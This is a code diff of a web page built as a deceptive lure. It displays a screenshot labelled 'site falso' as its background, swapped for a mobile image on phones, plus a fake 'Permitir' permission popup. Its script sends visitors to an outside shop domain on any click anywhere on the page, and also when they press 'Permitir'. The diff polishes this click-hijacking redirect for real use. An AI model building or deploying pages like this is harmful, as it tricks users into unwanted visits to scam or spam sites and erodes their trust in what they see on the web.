@@ -9,6 +9,7 @@
       margin: 0;
       font-family: Arial, sans-serif;
       background-color: #f1f1f1;
+      overflow: hidden;
     }
 
     #popup-container {
@@ -19,26 +20,25 @@
       left: 0;
       width: 100vw;
       height: 100vh;
-      background: rgba(0, 0, 0, 0.5);
+      background: rgba(0, 0, 0, 0.4);
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
 
     #popup {
       background: #fff;
-      max-width: 500px;
-      margin: 10% auto;
+      max-width: 90%;
+      width: 400px;
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
       text-align: center;
-      position: fixed;
-      z-index: 99;
-      bottom: -100px;
-      left: 30%;
     }
 
     #popup h2 {
       margin-top: 0;
-      font-size: 24px;
+      font-size: 22px;
     }
 
     #popup p {
@@ -65,14 +65,22 @@
       background: none;
       color: #4CAF50;
       text-decoration: underline;
-
-    
     }
 
     .site {
-      width: 100%;
-      height: 100%;
-      display: block;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+
+    @media only screen and (max-width: 768px) {
+      #popup {
+        width: 90%;
+      }
     }
   </style>
 </head>
@@ -85,20 +93,33 @@
     <button class="popup-button accept" onclick="aceitar()">Permitir</button>
     <button class="popup-button close" onclick="fechar()">Fechar</button>
   </div>
-  <img class="site" src="assets/fundo.png" alt="site falso">
+  <img id="fake-bg" class="site" src="" alt="site falso">
 </div>
 
 <script>
-    // Redireciona ao clicar em qualquer parte da página
-    document.addEventListener('click', function () {
-      window.location.href = "https://www.impulsegram.shop"; // <-- TROCA AQUI
-    });
-  
-    // Mostra o popup depois de alguns segundos (apenas visual)
-    setTimeout(() => {
-      document.getElementById('popup-container').style.display = 'flex';
-    }, 1000);
-  </script>
+  // Detecta se é mobile e altera o fundo
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  const bg = document.getElementById("fake-bg");
+  bg.src = isMobile ? "assets/mobile.jpeg" : "assets/fundo.png";
+
+  // Redireciona ao clicar em qualquer parte da página
+  document.addEventListener('click', function () {
+    window.location.href = "https://www.impulsegram.shop";
+  });
+
+  // Mostra o popup depois de 1 segundo
+  setTimeout(() => {
+    document.getElementById('popup-container').style.display = 'flex';
+  }, 1000);
+
+  function aceitar() {
+    window.location.href = "https://www.impulsegram.shop";
+  }
+
+  function fechar() {
+    document.getElementById('popup-container').style.display = 'none';
+  }
+</script>
 
 </body>
 </html>
